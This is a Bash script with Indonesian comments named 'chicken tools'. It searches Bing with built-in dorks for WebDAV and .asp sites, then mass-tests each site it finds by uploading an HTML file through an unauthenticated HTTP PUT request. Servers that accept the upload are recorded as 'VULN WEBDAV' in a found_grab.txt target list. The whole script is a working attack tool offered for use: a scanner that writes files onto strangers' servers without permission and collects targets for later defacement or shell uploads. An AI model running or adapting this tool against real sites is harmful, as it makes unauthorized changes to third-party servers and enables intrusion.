#!/bin/bash

# This time I use Indonesian if you can't use Indonesian please translate to english

# informasi tentang alat ini
#-----------------------------#
# author : Polygon            #
# bahasa : bash               #
# alat   : chicken tools      #
###############################
#  nama para contributions    #
#                             #
# - polygon65                 #
###############################

# jika anda punya sesuatu maka anda bisa melakukan tarik permintaan
# dan mencantumkan nama kalian ke tabel contribusi di atas


# plugins bash moderen

. lib/moduler.sh

# yg di butuhkan
Bash.import: util/IO.FUNC util/IO.SYSTEM.var util/IO.TYPE
Bash.import: text_display/colorama text_display/IO.ECHO
Bash.import: fake_useragent/HTTP.UA util/IO.SYSTEM.log
Bash.import: util/IO.SYSTEM.var urlib/urlparser

# warna (colors)
bi=$(mode.bold: biru)    cy=$(mode.bold: cyan)
ij=$(mode.bold: hijau)  hi=$(mode.normal: hitam)
me=$(mode.bold: merah)  un=$(mode.bold: ungu)
ku=$(mode.bold: kuning) pu=$(mode.bold: putih)
m=$(mode.bold: pink)    st=$(default.color)

# untuk menyesuaikan layar saat di perbesar maupun di perkecil
shopt -s checkwinsize
stty sane

# depencies
var::array: array_depencies = { curl lynx ncurses-utils toilet }
for depencies in "${array_depencies[@]}"; do
	command -v $depencies >/dev/null 2>&1 || {
		apt-get install $depencies -y >/dev/null 2>&1 || {
		print_err " network not found (tolong cek internet anda)"
		exit 32
		}
	}
done

# variable dork nya	
var dork_1 : 'intitle:"Directory Listing For /" + inurl:webdav'
var dork_2 : 'intitle:”index.of” intext:”(Win32) DAV/2″ intext:”Apache” site:com'
var dork_3 : "inurl:.ah.cn/*.asp"
var dork_4 : "inurl:.it/*.asp"
var dork_5 : "inurl:.uk/*.asp"
var dork_6 : "inurl:.ac.cn/*.asp"

@ mesin pencari dork nya menggunakan lynx

def: machine(){
	global: cari = "$1"
	var COUNT : 0
	while [ "$COUNT" -le 225 ]; do
		lynx "http://www.bing.com/search?q=${cari}&qs=n&pq=${cari}&sc=8-5&sp=-1&sk=&first=$COUNT&FORM=PORE" -dump -listonly >> asp.tmp
		COUNT=$((COUNT +12))
	done
}

# untuk membersihkan hasil dari output mesin pencari dork nya

def: cleaner(){
	var files : "$1"
	# biasanya hasil dork dari lynx mesti harus di parse agar bisa di scan
	cat "$files" | \
            grep -v 'http://www.bing.com' | \
            grep -v 'javascript:void' | \
            grep -v 'javascript:' | \
            grep -v 'Hidden links:' | \
            grep -v 'Visible links' | \
            grep -v 'References' | \
            grep -v 'msn.com' | \
            grep -v 'microsoft.com' | \
            grep -v 'yahoo.com' | \
            grep -v 'live.com' | \
            grep -v 'microsofttranslator.com' | \
            grep -v 'irongeek.com' | \
            grep -v 'hackforums.net' | \
            grep -v 'freelancer.com' | \
            grep -v 'facebook.com' | \
            grep -v 'mozilla.org' | \
            grep -v 'stackoverflow.com' | \
            grep -v 'php.net' | \
            grep -v 'wikipedia.org' | \
            grep -v 'amazon.com' | \
            grep -v '4shared.com' | \
            grep -v 'wordpress.org' | \
            grep -v 'about.com' | \
            grep -v 'phpbuilder.com' | \
            grep -v 'phpnuke.org' | \
            grep -v 'youtube.com' | \
            grep -v 'p4kurd.com' | \
            grep -v 'tizag.com' | \
            grep -v 'devshed.com' | \
            grep -v 'owasp.org' | \
            grep -v 'fictionbook.org' | \
            grep -v 'silenthacker.do.am' | \
            grep -v 'codingforums.com' | \
            grep -v 'tudosobrehacker.com' | \
            grep -v 'zymic.com' | \
            grep -v 'gaza-hacker.com' | \
            grep -v 'immortaltechnique.co.uk' | \
            cut -d' ' -f4 | \
            sed -f modules/urldecode.sed | \
            sed '/^$/d' | \
            sed 's/9.//' | \
            sed '/^$/d' | \
            sort | \
            uniq
}

# fungsi scan untuk menscan vuln dari hasil dork

def: scan(){
	global: scan = "$1"
	# fake user agent 
	ua=$(Bash::Ua.Random)

	# di gunakan untuk sample / kelinci percobaan nya
	
	Tulis.strN "
<html>
	<head>
		<title>test 1/1</title>
	<head>
<body>
	<p>testing 1/2</p>
</body>
	</html>
	" > asp.html
	# regex substitution untuk mengomptimalkan penyaringan dork
	regex_scan=$(echo "$scan" | urlparser% to hostname)
	regex_proto=$(echo "$scan" | urlparser% to protocol)
	main_subs=${regex_scan%%/}

	# nah yg di bawah ini di gunakan untuk menyaring hasil variable main_subs
	if test "$regex_scan" == "${main_subs}/"; then
		index="${regex_proto}://${regex_scan}"
	else
		index="${regex_proto}://${regex_scan}/"
	fi

	@ alat pengetest nya menggunakan curl
	
	get_response=$(curl --silent -L --header "User-Agent: $ua" --tcp-fastopen --ssl --request PUT --url "${index}asu.html" --upload-file asp.html)
	get_code=$(curl --silent -L --header "User-Agent: $ua" --ssl --tcp-fastopen --request PUT --url "${index}asu.html" --tcp-fastopen --upload-file asp.html -o /dev/null -w %{http_code})

	@ memvalidasi result 	
	if [[ ! -z "$get_response" ]]; then
		var a : 4
	else
		var a : 1
	fi
		if [[ $? == 0 ]]; then
			var b : 1
		else
			var b : 2
		fi
	if [[ $get_code == 200 ]]; then
		var c : 1
	else
		var c : 9
	fi

	# finish validasi
	let hasil=$a+$b+$c

	@ hasil akan di verifikasi untuk mengetahui target vuln atau tidak
	
	if ((hasil == 3)); then
	# di gunakan untuk menvalidasi sebuah hasil dari operator if di atas
		Tulis.strN "${ku}[${pu}$(date +%H:%M:%S)${ku}]${ku} [${ij}INFO${ij}]${un}->${pu} ${regex_proto}://${regex_scan} ${me}-${bi}>${ku} [${ij}VULN WEBDAV${ku}]${st}"
		Tulis.strN "${scan}" >> found_grab.txt
	else
		Tulis.strN "${ku}[${pu}$(date +%H:%M:%S)${ku}]${ku} [${ij}INFO${ij}]${un}->${pu} ${regex_proto}://${regex_scan} ${me}-${bi}>${ku} [${me}NOT${pu}-${me}VULN${ku}]${st}"
	fi
		
}

trap "tput rmcup; tput sgr0; tput cnorm; rm -rf asp.html asp.tmp; Tulis.strN 'EXIT'; exit" INT SIGINT

def: app_main(){

	# tput smcup untuk mengatur display
	
	tput smcup
	while [[ $REPLY != 0 ]]; do
		echo -ne "\e[46;5m\e[1;37m" # warna background nya
		clear
	cat <<- EOF
	╲╲┏━━┓╲╲
	╲━╋━━╋━╲	[ chicken tools grab ]
	╲╲┃◯◯┃╲╲
	╲┏╯┈◣┃╲╲	* author : polygon
	╲╰━┳┳╯╲╲	* github : Bayu12345677
	▔▔▔┗┗▔▔▔
	EOF
	echo
		echo
	echo

	Tulis.strN "1. dorking    2. dork webdav\n"
		read -p ">> " switch

	@ mengatur posisi dan warna ke default

	tput cup 10 0
	echo -ne ${st}
	tput ed
	tput cup 11 0
	tput sgr0
	tput rmcup
	
	case ${switch} in
					(1)
	                clear
				  sys.dork
					break ;;
					(2)
				clear
				sys.grab
				break
				esac
	done
}

def: sys.dork(){
	# banner nya make toilet aja :)

	banner_var=$(toilet -f slant -F border "dorking tools")
	Tulis.strN "${ku}${banner_var}${st}"
	Tulis.strN "${cy}${bsnner}${st}"
	Tulis.strN "${me}-> ${pu}author : polygon"
	Tulis.strN "${me}-> ${pu}github : Bayu12345677"
	echo
		echo
	Tulis.str "${me}->${ku} masukan dork kalian ${me}:${st} "
	read dork

	# yg di atas pasti dah paham
	# yg di bawah ini di gunakan untuk memvalidasi apakah input kosong apa ga
	# opsi -z fungsi nya jika string bernilai 0 maka akan di anggap benar
	# nah itu saya pakai untuk memvalidasi input

	if [[ -z "$dork" ]]; then
		println_err " input tidak boleh kosong"
		exit 25
	fi

	@ fungsi untuk mencari dork nya lewat paket Lynx
	machine "$dork"

	# fungsi maupun perintah pasti akan mengembalikan niai nah nilai 0 ini adalah angka yg dimana fungsi maupun command berhssil di eksekusi
	if [[ ! $? == 0 ]]; then
		println_info " Lynx error apakah anda memasukan dork yg valid ?"
		echo
			exit 23
	fi; echo

	@ :) ketik man test di terminal kalian ntar skroll aja 
	if [[ ! -f asp.tmp ]]; then
		println_info " hm sepertinya asp.tmp tidak ada (mohon cek internet anda atau masukan dork yg valid)"
		exit 23
	fi; (

	var jum : 0

	@ di bawah ini di gunakan untuk membersihkan dork
	
	hasil_dork=$(echo $(cleaner asp.tmp))

	@ jika isi dari variable hasil_dork kosong / bernilai zero (0) maka akan mengeksekusi command di dalam block then
	if [[ -z "$hasil_dork" ]]; then
		println_info " apakah dork valid ?"
		exit 5
	fi;
		# jika validasi di atas berhasil di lewatkan maka akan memulai proses dork nya
		
		for ambil in $(echo "$hasil_dork"); do
			delay: 01s
			Tulis.strN "${me}->${pu} ${ambil}${st}"
			Tulis.strN "${ambil}" >> dork.txt
		done
	); echo; {
		println_info " dork telah selesai (found [$(cat dork.txt | wc -l)])"
	}; echo
}

# fungsi maintance

def: app_maintance(){

Tulis.strN "
${un}╔╦╗┌─┐┬┌┐┌┌┬┐┌─┐┌┐┌┌─┐┌─┐
║║║├─┤││││ │ ├─┤││││  ├┤
╩ ╩┴ ┴┴┘└┘ ┴ ┴ ┴┘└┘└─┘└─┘${ij}
---------------------------------
${ku}[${me}!${ku}]${pu} (make update) to update the current repository
${ku}[${me}!${ku}]${pu} current version : $(cat version.txt)

${ku}[${cy}*${ij}*${ku}]${pu} link for discussion : https://chat.whatsapp.com/GxUnM7xAJyU7A0YYcjpnL0
";
 {
	exit $?
 };
}

# alat dork webdav

def: sys.grab(){
	banner=$(toilet -f slant -F border "grab webdav")

	Tulis.strN "${cy}${banner}${st}"
	Tulis.strN "${me}->${pu} Author ${me}:${pu} polygon"
	Tulis.strN "${me}->${pu} github ${me}:${pu} Bayu12345677"
	echo
	Tulis.str "${me}--> ${pu}masukan dork ${me}:${st} "
	read main_get

	echo
	# nah yg d bawah ini fungsi untuk memvalidasi variable main_get
	if [[ -z "$main_get" ]]; then
		echo; println_info " auto dork telah menyala"; echo
		@ yg di bawah ini adalah loop nya untuk memproses auto target by dork jika variable main_get bernilai zero
		echo; {
			for mengdork in $(echo -e "${dork_1}\n${dork_2}\n${dork_3}\n${dork_4}\n${dork_5}\n${dork_6}"); do

			# fungsi operator di bawah ini berfungsi untuk mengecek kondisi internet sampai proses benar benar berhenti
			
				if ! (curl -sL google.com > /dev/null 2>&1); then
					Tulis.strN "${ku}[${cy}$(date +%H:%M:%S)${ku}]${b}-> ${ku}[${ij}INFO${ku}]${pu} internet not found ${ku}[${un}404${ku}]${st}"
				fi

				# ini untuk memulai proses dork sampai memvalidasi nya
				machine "$mengdork"
				app_get=$(cleaner asp.tmp)
				for web in $(echo -e "$app_get"); do
					if ! (curl -sL google.com > /dev/null 2>&1); then
						Tulis.strN "${ku}[${cy}$(date +%H:%M:%S)${ku}]${b}-> ${ku}[${ij}INFO${ku}]${pu} internet not found ${ku}[${un}404${ku}]${st}"
					fi; {
							scan "$web";
							if [[ -f "asp.tmp" ]]; then
								rm -rf asp.tmp
							fi
							if [[ -f "asp.html" ]]; then
								rm -rf asp.tmp
							fi
						};
				done
			done; echo
		};
	fi; {
		# mencari dork
		
		machine "$main_get";

		# membersihkan

		bersih=$(cleaner asp.tmp);

		# mengambil hasil variable bersih
		for app_bersih in $(echo -e "$bersih"); do
			scan "$app_bersih";
		done;
		echo;
			if [[ ! -f "found_grab.txt" ]]; then
				Tulis.strN "FOUND ${ij}0${st}";
			else
				Tulis.strN "FOUND ${ij}$(cat found_grab.txt | wc -l)${st}";
			fi
			echo
		}; if [[ -f "asp.html" ]]; then rm -rf asp.html; fi
}; {
	# untuk fitur maintance nya	
	var::command version = "curl -sL https://raw.githubusercontent.com/Bayu12345677/chicken_tools/main/files/version.txt"

	if [[ "$(cat files/version.txt)" == "$version" ]]; then
		dumy=
	else
		{
			app_maintance;
		};
	fi
		
	var::command this = IO.func; (:); { $this.NAME app_main; } && { command eval app_main; } || { true; }
}

